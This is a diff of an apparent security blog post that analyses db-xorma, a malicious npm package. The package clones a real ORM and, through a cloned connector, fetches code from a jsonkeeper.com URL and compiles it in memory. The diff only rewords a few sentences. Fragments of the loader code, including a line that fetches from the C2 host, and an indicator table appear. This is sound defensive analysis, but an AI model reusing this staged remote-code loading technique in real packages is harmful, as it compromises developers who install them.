@@ -8,7 +8,7 @@ ecosystem: npm
 
 <img src="/assets/images/db-xorma-laundry-everywhere.jpg" alt="The Buzz Lightyear 'everywhere' meme — Buzz gestures wide while Woody frets, captioned 'LAUNDRY. LAUNDRY, EVERYWHERE.' — for malware that hides behind clean clothes at every hop: a cloned ORM, a cloned connector, and a borrowed installer, all legitimate-looking, with the real payload fetched at runtime instead of shipped." style="width: 60%; height: auto;">
 
-Most malicious npm packages smuggle their payload inside the tarball — an obfuscated blob, a poisoned install hook; db-xorma keeps its weapon off-package entirely and ships little more than a working library. It is a working clone of `xorma`, a real mobx-powered reactive ORM, with the store, the undo/redo history, even the author line all lifted — the clean clothes the whole operation hides behind. Instantiate any model and a static method the clone bolted on, `resetor()`, pulls a second package off the registry at runtime and lets it fetch a third stage.
+Most malicious npm packages smuggle their payload inside the tarball — an obfuscated blob, a poisoned install hook; db-xorma keeps its weapon off-package entirely. It is a working clone of `xorma`, a real mobx-powered reactive ORM, with the store, the undo/redo history, even the author line all lifted — the clean clothes the whole operation hides behind. Instantiate any model and a static method the clone bolted on, `resetor()`, pulls a second package off the registry at runtime and lets it fetch a third stage.
 
 ## Stage 1 — the armed CommonJS twin
 
@@ -49,11 +49,11 @@ The install gets the same treatment: `npm().install(...)` looks like a programma
 </code></pre>
 {% endraw %}
 
-What db-xorma gains is a clean source — no `execSync`, no child_process import, not even an install string, because every such primitive sits one dependency away in oubliette. Oubliette is genuinely blameless, a real programmatic-npm wrapper by Stephen Cresswell born when npm dropped its API in v8.0.0; the malware simply rents its respectability.
+What db-xorma gains is a clean source — no `execSync`, no child_process import, not even an install string, because every such primitive sits one dependency away in oubliette. Oubliette is blameless, a real programmatic-npm wrapper by Stephen Cresswell born when npm dropped its API in v8.0.0; the malware rents its respectability.
 
 ## Stage 2 — the connector that compiles a ghost
 
-db-dx-connector is a near-verbatim clone of Divblox's real `dx-db-connector`, author line and all, with one extra method. It base64-decodes a jsonkeeper.com URL, pulls the JSON's content field with axios, and compiles the response in memory as a fake module named error.js via `Module._compile` — no temp file, no eval keyword, and a public paste host the operator can re-stock without re-touching npm.
+db-dx-connector is a near-verbatim clone of Divblox's real `dx-db-connector`, author line and all, with one extra method. It base64-decodes a jsonkeeper.com URL, pulls the JSON's content field with axios, and compiles the response in memory as a fake module named error.js via `Module._compile` — no temp file, no eval keyword, and a public paste host the operator can re-stock without touching npm.
 
 {% raw %}
 <pre class="lang-js"><code><span class="tok-kw">async</span> <span class="tok-fn">queryDBConnect</span>() {
@@ -127,4 +127,4 @@ axios.<span class="tok-fn">get</span>(C2).<span class="tok-fn">then</span>((res)
 | Prior-campaign target (commented) | `clsx-js` |
 | Dropped artifact | `0001.dat` (in `os.tmpdir()`) |
 
-Strip the three clean wrappers — a real ORM, a real connector, a real installer — and db-xorma is just a courier: npm does the fetching, npm does the detonating, and the dirtiest laundry, the obfuscated loader, is the one thing it never carries. The whole bet was that subtlety reads as safety — nothing obfuscated, nothing on disk, the install buried one dependency deep — yet Atomdrift flagged every hop as hostile anyway, because it scores the plumbing, not the dirt, and a laundered channel is still a channel.
+Strip the three clean wrappers — a real ORM, a real connector, a real installer — and db-xorma is a courier: npm does the fetching, npm does the detonating, and the dirtiest laundry, the obfuscated loader, is the one thing it never carries. The whole bet was that subtlety reads as safety — nothing obfuscated, nothing on disk, the install buried one dependency deep — yet Atomdrift flagged every hop as hostile, because it scores the plumbing, not the dirt, and a laundered channel is still a channel.
